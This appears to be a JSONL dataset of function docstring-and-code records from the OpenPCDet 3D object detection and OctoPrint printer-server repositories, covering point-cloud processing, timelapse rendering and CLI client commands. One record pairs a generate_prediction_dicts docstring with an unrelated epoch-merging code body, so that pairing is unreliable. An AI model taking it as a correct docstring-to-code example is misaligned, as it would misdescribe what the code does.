{"docstring": "\"\"\"\nReturns the data path as well as all annotations related to that sample_data.\nNote that the boxes are transformed into the current sensor's coordinate frame.\nArgs:\n    nusc:\n    sample_data_token: Sample_data token.\n    selected_anntokens: If provided only return the selected annotation.\n\nReturns:\n\n\"\"\"\n# Retrieve sensor & pose records\n", "func_signal": "def get_sample_data(nusc, sample_data_token, selected_anntokens=None):\n", "code": "sd_record = nusc.get('sample_data', sample_data_token)\ncs_record = nusc.get('calibrated_sensor', sd_record['calibrated_sensor_token'])\nsensor_record = nusc.get('sensor', cs_record['sensor_token'])\npose_record = nusc.get('ego_pose', sd_record['ego_pose_token'])\n\ndata_path = nusc.get_sample_data_path(sample_data_token)\n\nif sensor_record['modality'] == 'camera':\n    cam_intrinsic = np.array(cs_record['camera_intrinsic'])\n    imsize = (sd_record['width'], sd_record['height'])\nelse:\n    cam_intrinsic = imsize = None\n\n# Retrieve all sample annotations and map to sensor coordinate system.\nif selected_anntokens is not None:\n    boxes = list(map(nusc.get_box, selected_anntokens))\nelse:\n    boxes = nusc.get_boxes(sample_data_token)\n\n# Make list of Box objects including coord system transforms.\nbox_list = []\nfor box in boxes:\n    box.velocity = nusc.box_velocity(box.token)\n    # Move box to ego vehicle coord system\n    box.translate(-np.array(pose_record['translation']))\n    box.rotate(Quaternion(pose_record['rotation']).inverse)\n\n    #  Move box to sensor coord system\n    box.translate(-np.array(cs_record['translation']))\n    box.rotate(Quaternion(cs_record['rotation']).inverse)\n\n    box_list.append(box)\n\nreturn data_path, box_list, cam_intrinsic", "path": "OpenPCDet/pcdet/datasets/nuscenes/nuscenes_utils.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    batch_dict:\n        batch_size:\n        batch_cls_preds: (B, num_boxes, num_classes | 1) or (N1+N2+..., num_classes | 1)\n                        or [(B, num_boxes, num_class1), (B, num_boxes, num_class2) ...]\n        multihead_label_mapping: [(num_class1), (num_class2), ...]\n        batch_box_preds: (B, num_boxes, 7+C) or (N1+N2+..., 7+C)\n        cls_preds_normalized: indicate whether batch_cls_preds is normalized\n        batch_index: optional (N1+N2+...)\n        has_class_labels: True/False\n        roi_labels: (B, num_rois)  1 .. num_classes\n        batch_pred_labels: (B, num_boxes, 1)\nReturns:\n\n\"\"\"\n", "func_signal": "def post_processing(self, batch_dict):\n", "code": "post_process_cfg = self.model_cfg.POST_PROCESSING\nbatch_size = batch_dict['batch_size']\nrecall_dict = {}\npred_dicts = []\nfor index in range(batch_size):\n    if batch_dict.get('batch_index', None) is not None:\n        assert batch_dict['batch_box_preds'].shape.__len__() == 2\n        batch_mask = (batch_dict['batch_index'] == index)\n    else:\n        assert batch_dict['batch_box_preds'].shape.__len__() == 3\n        batch_mask = index\n\n    box_preds = batch_dict['batch_box_preds'][batch_mask]\n    src_box_preds = box_preds\n\n    if not isinstance(batch_dict['batch_cls_preds'], list):\n        cls_preds = batch_dict['batch_cls_preds'][batch_mask]\n\n        src_cls_preds = cls_preds\n        assert cls_preds.shape[1] in [1, self.num_class]\n\n        if not batch_dict['cls_preds_normalized']:\n            cls_preds = torch.sigmoid(cls_preds)\n    else:\n        cls_preds = [x[batch_mask] for x in batch_dict['batch_cls_preds']]\n        src_cls_preds = cls_preds\n        if not batch_dict['cls_preds_normalized']:\n            cls_preds = [torch.sigmoid(x) for x in cls_preds]\n\n    if post_process_cfg.NMS_CONFIG.MULTI_CLASSES_NMS:\n        if not isinstance(cls_preds, list):\n            cls_preds = [cls_preds]\n            multihead_label_mapping = [torch.arange(1, self.num_class, device=cls_preds[0].device)]\n        else:\n            multihead_label_mapping = batch_dict['multihead_label_mapping']\n\n        cur_start_idx = 0\n        pred_scores, pred_labels, pred_boxes = [], [], []\n        for cur_cls_preds, cur_label_mapping in zip(cls_preds, multihead_label_mapping):\n            assert cur_cls_preds.shape[1] == len(cur_label_mapping)\n            cur_box_preds = box_preds[cur_start_idx: cur_start_idx + cur_cls_preds.shape[0]]\n            cur_pred_scores, cur_pred_labels, cur_pred_boxes = model_nms_utils.multi_classes_nms(\n                cls_scores=cur_cls_preds, box_preds=cur_box_preds,\n                nms_config=post_process_cfg.NMS_CONFIG,\n                score_thresh=post_process_cfg.SCORE_THRESH\n            )\n            cur_pred_labels = cur_label_mapping[cur_pred_labels]\n            pred_scores.append(cur_pred_scores)\n            pred_labels.append(cur_pred_labels)\n            pred_boxes.append(cur_pred_boxes)\n            cur_start_idx += cur_cls_preds.shape[0]\n\n        final_scores = torch.cat(pred_scores, dim=0)\n        final_labels = torch.cat(pred_labels, dim=0)\n        final_boxes = torch.cat(pred_boxes, dim=0)\n    else:\n        cls_preds, label_preds = torch.max(cls_preds, dim=-1)\n        if batch_dict.get('has_class_labels', False):\n            label_key = 'roi_labels' if 'roi_labels' in batch_dict else 'batch_pred_labels'\n            label_preds = batch_dict[label_key][index]\n        else:\n            label_preds = label_preds + 1\n        selected, selected_scores = model_nms_utils.class_agnostic_nms(\n            box_scores=cls_preds, box_preds=box_preds,\n            nms_config=post_process_cfg.NMS_CONFIG,\n            score_thresh=post_process_cfg.SCORE_THRESH\n        )\n\n        if post_process_cfg.OUTPUT_RAW_SCORE:\n            max_cls_preds, _ = torch.max(src_cls_preds, dim=-1)\n            selected_scores = max_cls_preds[selected]\n\n        final_scores = selected_scores\n        final_labels = label_preds[selected]\n        final_boxes = box_preds[selected]\n\n    recall_dict = self.generate_recall_record(\n        box_preds=final_boxes if 'rois' not in batch_dict else src_box_preds,\n        recall_dict=recall_dict, batch_index=index, data_dict=batch_dict,\n        thresh_list=post_process_cfg.RECALL_THRESH_LIST\n    )\n\n    record_dict = {\n        'pred_boxes': final_boxes,\n        'pred_scores': final_scores,\n        'pred_labels': final_labels\n    }\n    pred_dicts.append(record_dict)\n\nreturn pred_dicts, recall_dict", "path": "OpenPCDet/pcdet/models/detectors/detector3d_template.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    all_anchors: [(N, 7), ...]\n    gt_boxes: (B, M, 8)\nReturns:\n\n\"\"\"\n\n", "func_signal": "def assign_targets(self, all_anchors, gt_boxes_with_classes):\n", "code": "bbox_targets = []\ncls_labels = []\nreg_weights = []\n\nbatch_size = gt_boxes_with_classes.shape[0]\ngt_classes = gt_boxes_with_classes[:, :, -1]\ngt_boxes = gt_boxes_with_classes[:, :, :-1]\nfor k in range(batch_size):\n    cur_gt = gt_boxes[k]\n    cnt = cur_gt.__len__() - 1\n    while cnt > 0 and cur_gt[cnt].sum() == 0:\n        cnt -= 1\n    cur_gt = cur_gt[:cnt + 1]\n    cur_gt_classes = gt_classes[k][:cnt + 1].int()\n\n    target_list = []\n    for anchor_class_name, anchors in zip(self.anchor_class_names, all_anchors):\n        if cur_gt_classes.shape[0] > 1:\n            mask = torch.from_numpy(self.class_names[cur_gt_classes.cpu() - 1] == anchor_class_name)\n        else:\n            mask = torch.tensor([self.class_names[c - 1] == anchor_class_name\n                                 for c in cur_gt_classes], dtype=torch.bool)\n\n        if self.use_multihead:\n            anchors = anchors.permute(3, 4, 0, 1, 2, 5).contiguous().view(-1, anchors.shape[-1])\n            # if self.seperate_multihead:\n            #     selected_classes = cur_gt_classes[mask].clone()\n            #     if len(selected_classes) > 0:\n            #         new_cls_id = self.gt_remapping[anchor_class_name]\n            #         selected_classes[:] = new_cls_id\n            # else:\n            #     selected_classes = cur_gt_classes[mask]\n            selected_classes = cur_gt_classes[mask]\n        else:\n            feature_map_size = anchors.shape[:3]\n            anchors = anchors.view(-1, anchors.shape[-1])\n            selected_classes = cur_gt_classes[mask]\n\n        single_target = self.assign_targets_single(\n            anchors,\n            cur_gt[mask],\n            gt_classes=selected_classes,\n            matched_threshold=self.matched_thresholds[anchor_class_name],\n            unmatched_threshold=self.unmatched_thresholds[anchor_class_name]\n        )\n        target_list.append(single_target)\n\n    if self.use_multihead:\n        target_dict = {\n            'box_cls_labels': [t['box_cls_labels'].view(-1) for t in target_list],\n            'box_reg_targets': [t['box_reg_targets'].view(-1, self.box_coder.code_size) for t in target_list],\n            'reg_weights': [t['reg_weights'].view(-1) for t in target_list]\n        }\n\n        target_dict['box_reg_targets'] = torch.cat(target_dict['box_reg_targets'], dim=0)\n        target_dict['box_cls_labels'] = torch.cat(target_dict['box_cls_labels'], dim=0).view(-1)\n        target_dict['reg_weights'] = torch.cat(target_dict['reg_weights'], dim=0).view(-1)\n    else:\n        target_dict = {\n            'box_cls_labels': [t['box_cls_labels'].view(*feature_map_size, -1) for t in target_list],\n            'box_reg_targets': [t['box_reg_targets'].view(*feature_map_size, -1, self.box_coder.code_size)\n                                for t in target_list],\n            'reg_weights': [t['reg_weights'].view(*feature_map_size, -1) for t in target_list]\n        }\n        target_dict['box_reg_targets'] = torch.cat(\n            target_dict['box_reg_targets'], dim=-2\n        ).view(-1, self.box_coder.code_size)\n\n        target_dict['box_cls_labels'] = torch.cat(target_dict['box_cls_labels'], dim=-1).view(-1)\n        target_dict['reg_weights'] = torch.cat(target_dict['reg_weights'], dim=-1).view(-1)\n\n    bbox_targets.append(target_dict['box_reg_targets'])\n    cls_labels.append(target_dict['box_cls_labels'])\n    reg_weights.append(target_dict['reg_weights'])\n\nbbox_targets = torch.stack(bbox_targets, dim=0)\n\ncls_labels = torch.stack(cls_labels, dim=0)\nreg_weights = torch.stack(reg_weights, dim=0)\nall_targets_dict = {\n    'box_cls_labels': cls_labels,\n    'box_reg_targets': bbox_targets,\n    'reg_weights': reg_weights\n\n}\nreturn all_targets_dict", "path": "OpenPCDet/pcdet/models/dense_heads/target_assigner/axis_aligned_target_assigner.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    batch_dict:\n        batch_size: int\n        vfe_features: (num_voxels, C)\n        points: (num_points, 4 + C), [batch_idx, x, y, z, ...]\nReturns:\n    batch_dict:\n        encoded_spconv_tensor: sparse tensor\n        point_features: (N, C)\n\"\"\"\n", "func_signal": "def forward(self, batch_dict):\n", "code": "batch_size = batch_dict['batch_size']\npoints = batch_dict['points']\nbatch_idx, xyz, features = self.break_up_pc(points)\n\nxyz_batch_cnt = xyz.new_zeros(batch_size).int()\nfor bs_idx in range(batch_size):\n    xyz_batch_cnt[bs_idx] = (batch_idx == bs_idx).sum()\n\nl_xyz, l_features, l_batch_cnt = [xyz], [features], [xyz_batch_cnt]\nfor i in range(len(self.SA_modules)):\n    new_xyz_list = []\n    for k in range(batch_size):\n        if len(l_xyz) == 1:\n            cur_xyz = l_xyz[0][batch_idx == k]\n        else:\n            last_num_points = self.num_points_each_layer[i - 1]\n            cur_xyz = l_xyz[-1][k * last_num_points: (k + 1) * last_num_points]\n        cur_pt_idxs = pointnet2_utils_stack.furthest_point_sample(\n            cur_xyz[None, :, :].contiguous(), self.num_points_each_layer[i]\n        ).long()[0]\n        if cur_xyz.shape[0] < self.num_points_each_layer[i]:\n            empty_num = self.num_points_each_layer[i] - cur_xyz.shape[1]\n            cur_pt_idxs[0, -empty_num:] = cur_pt_idxs[0, :empty_num]\n        new_xyz_list.append(cur_xyz[cur_pt_idxs])\n    new_xyz = torch.cat(new_xyz_list, dim=0)\n\n    new_xyz_batch_cnt = xyz.new_zeros(batch_size).int().fill_(self.num_points_each_layer[i])\n    li_xyz, li_features = self.SA_modules[i](\n        xyz=l_xyz[i], features=l_features[i], xyz_batch_cnt=l_batch_cnt[i],\n        new_xyz=new_xyz, new_xyz_batch_cnt=new_xyz_batch_cnt\n    )\n\n    l_xyz.append(li_xyz)\n    l_features.append(li_features)\n    l_batch_cnt.append(new_xyz_batch_cnt)\n\nl_features[0] = points[:, 1:]\nfor i in range(-1, -(len(self.FP_modules) + 1), -1):\n    l_features[i - 1] = self.FP_modules[i](\n        unknown=l_xyz[i - 1], unknown_batch_cnt=l_batch_cnt[i - 1],\n        known=l_xyz[i], known_batch_cnt=l_batch_cnt[i],\n        unknown_feats=l_features[i - 1], known_feats=l_features[i]\n    )\n\nbatch_dict['point_features'] = l_features[0]\nbatch_dict['point_coords'] = torch.cat((batch_idx[:, None].float(), l_xyz[0]), dim=1)\nreturn batch_dict", "path": "OpenPCDet/pcdet/models/backbones_3d/pointnet2_backbone.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nTo support a custom dataset, implement this function to receive the predicted results from the model, and then\ntransform the unified normative coordinate to your required coordinate, and optionally save them to disk.\n\nArgs:\n    batch_dict: dict of original data from the dataloader\n    pred_dicts: dict of predicted results from the model\n        pred_boxes: (N, 7), Tensor\n        pred_scores: (N), Tensor\n        pred_labels: (N), Tensor\n    class_names:\n    output_path: if it is not None, save the results to this path\nReturns:\n\n\"\"\"\n\n", "func_signal": "def generate_prediction_dicts(batch_dict, pred_dicts, class_names, output_path=None):\n", "code": "\nif merge:\n    self._merge_all_iters_to_one_epoch = True\n    self.total_epochs = epochs\nelse:\n    self._merge_all_iters_to_one_epoch = False", "path": "OpenPCDet/pcdet/datasets/dataset.py", "commit_date": "2020-11-07 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\n:param pts_lidar: (N, 3)\n:return pts_rect: (N, 3)\n\"\"\"\n", "func_signal": "def rect_to_lidar(self, pts_rect):\n", "code": "pts_rect_hom = self.cart_to_hom(pts_rect)  # (N, 4)\nR0_ext = np.hstack((self.R0, np.zeros((3, 1), dtype=np.float32)))  # (3, 4)\nR0_ext = np.vstack((R0_ext, np.zeros((1, 4), dtype=np.float32)))  # (4, 4)\nR0_ext[3, 3] = 1\nV2C_ext = np.vstack((self.V2C, np.zeros((1, 4), dtype=np.float32)))  # (4, 4)\nV2C_ext[3, 3] = 1\n\npts_lidar = np.dot(pts_rect_hom, np.linalg.inv(np.dot(R0_ext, V2C_ext).T))\nreturn pts_lidar[:, 0:3]", "path": "OpenPCDet/pcdet/utils/calibration_kitti.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"Notifies registered callbacks of type `callback`.\"\"\"\n", "func_signal": "def _notify_callback(self, callback, *args, **kwargs):\n", "code": "name = \"_on_{}\".format(callback)\nmethod = getattr(self, name, None)\nif method is not None and callable(method):\n    method(*args, **kwargs)", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "# we only use the final image as post roll\n", "func_signal": "def process_post_roll(self):\n", "code": "self._copying_postroll()\nself.post_roll_finished()", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"\nResumes processing of the queue, e.g. when a print has finished.\n\"\"\"\n\n", "func_signal": "def resume(self):\n", "code": "self._logger.debug(\"Resuming analyzer\")\nself._active.set()", "path": "OctoPrint/src/octoprint/filemanager/analysis.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"POSTs JSON data to the specified server path, taking the data from the specified file.\"\"\"\n", "func_signal": "def post_from_file(ctx, path, file_path, json_flag, yaml_flag, timeout):\n", "code": "if json_flag or yaml_flag:\n    if json_flag:\n        with io.open(file_path, \"rt\") as fp:\n            data = json.load(fp)\n    else:\n        import yaml\n\n        with io.open(file_path, \"rt\") as fp:\n            data = yaml.safe_load(fp)\n\n    r = ctx.obj.client.post_json(path, data, timeout=timeout)\nelse:\n    with io.open(file_path, \"rb\") as fp:\n        data = fp.read()\n\n    r = ctx.obj.client.post(path, data, timeout=timeout)\n\nlog_response(r)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "# we always copy the final image for the whole post roll\n# for z based timelapses\n", "func_signal": "def process_post_roll(self):\n", "code": "self._copying_postroll()\nTimelapse.process_post_roll(self)", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"POSTs JSON data to the specified server path.\"\"\"\n", "func_signal": "def post_json(ctx, path, data, timeout):\n", "code": "r = ctx.obj.client.post_json(path, data, timeout=timeout)\nlog_response(r)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"\n>>> _extract_prefix(\"some_long_filename_without_hyphen.jpg\")\n>>> _extract_prefix(\"-first_char_is_hyphen.jpg\")\n>>> _extract_prefix(\"some_long_filename_with-stuff.jpg\") # doctest: +ALLOW_UNICODE\n'some_long_filename_with'\n\"\"\"\n", "func_signal": "def _extract_prefix(filename):\n", "code": "pos = filename.rfind(\"-\")\nif not pos or pos < 0:\n    return None\nreturn filename[:pos]", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"Rendering runnable.\"\"\"\n\n", "func_signal": "def _render(self):\n", "code": "ffmpeg = settings().get([\"webcam\", \"ffmpeg\"])\nbitrate = settings().get([\"webcam\", \"bitrate\"])\nif ffmpeg is None or bitrate is None:\n    self._logger.warning(\n        \"Cannot create movie, path to ffmpeg or desired bitrate is unset\"\n    )\n    return\n\nif self._videocodec == \"mpeg2video\":\n    extension = \"mpg\"\nelse:\n    extension = \"mp4\"\n\ninput = os.path.join(\n    self._capture_dir,\n    self._capture_format.format(\n        prefix=self._prefix,\n        postfix=self._postfix if self._postfix is not None else \"\",\n    ),\n)\n\noutput_name = self._output_format.format(\n    prefix=self._prefix,\n    postfix=self._postfix if self._postfix is not None else \"\",\n    extension=extension,\n)\ntemporary = os.path.join(self._output_dir, \".{}\".format(output_name))\noutput = os.path.join(self._output_dir, output_name)\n\nfor i in range(4):\n    if os.path.exists(input % i):\n        break\nelse:\n    self._logger.warning(\"Cannot create a movie, no frames captured\")\n    self._notify_callback(\n        \"fail\", output, returncode=0, stdout=\"\", stderr=\"\", reason=\"no_frames\"\n    )\n    return\n\nhflip = settings().getBoolean([\"webcam\", \"flipH\"])\nvflip = settings().getBoolean([\"webcam\", \"flipV\"])\nrotate = settings().getBoolean([\"webcam\", \"rotate90\"])\n\nwatermark = None\nif settings().getBoolean([\"webcam\", \"watermark\"]):\n    watermark = os.path.join(\n        os.path.dirname(__file__), \"static\", \"img\", \"watermark.png\"\n    )\n    if sys.platform == \"win32\":\n        # Because ffmpeg hiccups on windows' drive letters and backslashes we have to give the watermark\n        # path a special treatment. Yeah, I couldn't believe it either...\n        watermark = watermark.replace(\"\\\\\", \"/\").replace(\":\", \"\\\\\\\\:\")\n\n# prepare ffmpeg command\ncommand_str = self._create_ffmpeg_command_string(\n    ffmpeg,\n    self._fps,\n    bitrate,\n    self._threads,\n    input,\n    temporary,\n    self._videocodec,\n    hflip=hflip,\n    vflip=vflip,\n    rotate=rotate,\n    watermark=watermark,\n)\nself._logger.debug(\"Executing command: {}\".format(command_str))\n\nwith self.render_job_lock:\n    try:\n        self._notify_callback(\"start\", output)\n\n        self._logger.debug(\"Parsing ffmpeg output\")\n\n        c = CommandlineCaller()\n        c.on_log_stderr = self._process_ffmpeg_output\n        returncode, stdout_text, stderr_text = c.call(\n            command_str, delimiter=b\"\\r\", buffer_size=512\n        )\n\n        self._logger.debug(\"Done with parsing\")\n\n        if returncode == 0:\n            shutil.move(temporary, output)\n            self._notify_callback(\"success\", output)\n        else:\n            self._logger.warning(\n                \"Could not render movie, got return code %r: %s\"\n                % (returncode, stderr_text)\n            )\n            self._notify_callback(\n                \"fail\",\n                output,\n                returncode=returncode,\n                stdout=stdout_text,\n                stderr=stderr_text,\n                reason=\"returncode\",\n            )\n    except Exception:\n        self._logger.exception(\"Could not render movie due to unknown error\")\n        self._notify_callback(\"fail\", output, reason=\"unknown\")\n    finally:\n        try:\n            if os.path.exists(temporary):\n                os.remove(temporary)\n        except Exception:\n            self._logger.warning(\n                \"Could not delete temporary timelapse {}\".format(temporary)\n            )\n        self._notify_callback(\"always\", output)", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"\nDetermine the files to delete when rolling over.\n\"\"\"\n", "func_signal": "def getFilesToDelete(self):\n", "code": "dirName, baseName = os.path.split(self.baseFilename)\nfileNames = os.listdir(dirName)\nresult = []\nprefix = baseName + \".\"\nplen = len(prefix)\nfor fileName in fileNames:\n    if fileName[:plen] == prefix:\n        suffix = fileName[plen:]\n        if type(self).file_pattern.match(suffix):\n            result.append(os.path.join(dirName, fileName))\nresult.sort()\nif len(result) < self.backupCount:\n    result = []\nelse:\n    result = result[: len(result) - self.backupCount]\nreturn result", "path": "OctoPrint/src/octoprint/logging/handlers.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"\nPauses processing of the queue, e.g. when a print is active.\n\"\"\"\n\n", "func_signal": "def pause(self):\n", "code": "self._logger.debug(\"Pausing analysis\")\nself._active.clear()\nif self._current is not None:\n    self._logger.debug(\n        \"Aborting running analysis, will restart when analyzer is resumed\"\n    )\n    self._do_abort()", "path": "OctoPrint/src/octoprint/filemanager/analysis.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"Performs a GET request against the specified server path.\"\"\"\n", "func_signal": "def get(ctx, path, timeout):\n", "code": "r = ctx.obj.client.get(path, timeout=timeout)\nlog_response(r)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"Basic API client.\"\"\"\n", "func_signal": "def client(ctx, apikey, host, port, httpuser, httppass, https, prefix):\n", "code": "try:\n    settings = None\n    if not host or not port or not apikey:\n        settings = init_settings(\n            get_ctx_obj_option(ctx, \"basedir\", None),\n            get_ctx_obj_option(ctx, \"configfile\", None),\n        )\n\n    ctx.obj.client = create_client(\n        settings=settings,\n        apikey=apikey,\n        host=host,\n        port=port,\n        httpuser=httpuser,\n        httppass=httppass,\n        https=https,\n        prefix=prefix,\n    )\n\nexcept FatalStartupError as e:\n    click.echo(str(e), err=True)\n    click.echo(\"There was a fatal error initializing the client.\", err=True)\n    ctx.exit(-1)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"\nOverride this to perform additional actions upon the pausing of a print job.\n\"\"\"\n", "func_signal": "def on_print_resumed(self, event, payload):\n", "code": "if not self._in_timelapse:\n    self.start_timelapse(payload[\"name\"])", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "# check if height difference equals z-hop, if so don't take a picture\n", "func_signal": "def _on_z_change(self, event, payload):\n", "code": "if (\n    self._retraction_zhop != 0\n    and payload[\"old\"] is not None\n    and payload[\"new\"] is not None\n):\n    diff = round(abs(payload[\"new\"] - payload[\"old\"]), 3)\n    zhop = round(self._retraction_zhop, 3)\n    if diff == zhop:\n        return\n\n# check if last picture has been less than min_delay ago, if so don't take a picture (anti vase mode...)\nnow = monotonic_time()\nif (\n    self._min_delay\n    and self._last_snapshot\n    and self._last_snapshot + self._min_delay > now\n):\n    self._logger.debug(\"Rate limited z-change, not taking a snapshot\")\n    return\n\nself.capture_image()\nself._last_snapshot = now", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"Sends a DELETE request to the specified server path.\"\"\"\n", "func_signal": "def delete(ctx, path, timeout):\n", "code": "r = ctx.obj.client.delete(path, timeout=timeout)\nlog_response(r)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"PATCHes JSON data to the specified server path.\"\"\"\n", "func_signal": "def patch_json(ctx, path, data, timeout):\n", "code": "r = ctx.obj.client.patch(path, data, encoding=\"json\", timeout=timeout)\nlog_response(r)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"Uploads the specified file to the specified server path.\"\"\"\n", "func_signal": "def upload(ctx, path, file_path, params, file_name, content_type, timeout):\n", "code": "data = {}\nfor param in params:\n    data[param[0]] = param[1]\n\nr = ctx.obj.client.upload(\n    path,\n    file_path,\n    additional=data,\n    file_name=file_name,\n    content_type=content_type,\n    timeout=timeout,\n)\nlog_response(r)", "path": "OctoPrint/src/octoprint/cli/client.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"\nEnqueues an ``entry`` for analysis by the queue.\n\nIf ``high_priority`` is True (defaults to False), the entry will be prioritized and hence processed before\nother entries in the queue with normal priority.\n\nArguments:\n    entry (QueueEntry): The :class:`QueueEntry` to analyze.\n    high_priority (boolean): Whether to process the provided entry with high priority (True) or not\n        (False, default)\n\"\"\"\n\n", "func_signal": "def enqueue(self, entry, high_priority=False):\n", "code": "if settings().get([\"gcodeAnalysis\", \"runAt\"]) == \"never\":\n    self._logger.debug(\n        \"Ignoring entry {entry} for analysis queue\".format(entry=entry)\n    )\n    return\nelif high_priority:\n    self._logger.debug(\n        \"Adding entry {entry} to analysis queue with high priority\".format(\n            entry=entry\n        )\n    )\n    prio = self.__class__.HIGH_PRIO\nelse:\n    self._logger.debug(\n        \"Adding entry {entry} to analysis queue with low priority\".format(\n            entry=entry\n        )\n    )\n    prio = self.__class__.LOW_PRIO\n\nself._queue.put((prio, entry, high_priority))\nif high_priority and self._current is not None and not self._current_highprio:\n    self._logger.debug(\"Aborting current analysis in favor of high priority one\")\n    self._do_abort()", "path": "OctoPrint/src/octoprint/filemanager/analysis.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "# pre-capture hook\n", "func_signal": "def _perform_capture(self, filename, onerror=None):\n", "code": "for hook in self._pre_capture_hooks.values():\n    try:\n        hook(filename)\n    except Exception:\n        self._logger.exception(\n            \"Error while processing hook {name}.\".format(**locals())\n        )\n\neventManager().fire(Events.CAPTURE_START, {\"file\": filename})\ntry:\n    self._logger.debug(\n        \"Going to capture {} from {}\".format(filename, self._snapshot_url)\n    )\n    r = requests.get(\n        self._snapshot_url,\n        stream=True,\n        timeout=self._snapshot_timeout,\n        verify=self._snapshot_validate_ssl,\n    )\n    r.raise_for_status()\n\n    with io.open(filename, \"wb\") as f:\n        for chunk in r.iter_content(chunk_size=1024):\n            if chunk:\n                f.write(chunk)\n                f.flush()\n\n    self._logger.debug(\n        \"Image {} captured from {}\".format(filename, self._snapshot_url)\n    )\nexcept Exception as e:\n    self._logger.exception(\n        \"Could not capture image {} from {}\".format(filename, self._snapshot_url)\n    )\n    self._capture_errors += 1\n    err = e\nelse:\n    self._capture_success += 1\n    err = None\n\n# post-capture hook\nfor hook in self._post_capture_hooks.values():\n    try:\n        hook(filename, err is None)\n    except Exception:\n        self._logger.exception(\n            \"Error while processing hook {name}.\".format(**locals())\n        )\n\n# handle events and onerror call\nif err is None:\n    eventManager().fire(Events.CAPTURE_DONE, {\"file\": filename})\n    return True\nelse:\n    if callable(onerror):\n        onerror()\n    eventManager().fire(\n        Events.CAPTURE_FAILED,\n        {\"file\": filename, \"error\": str(err), \"url\": self._snapshot_url},\n    )\n    return False", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
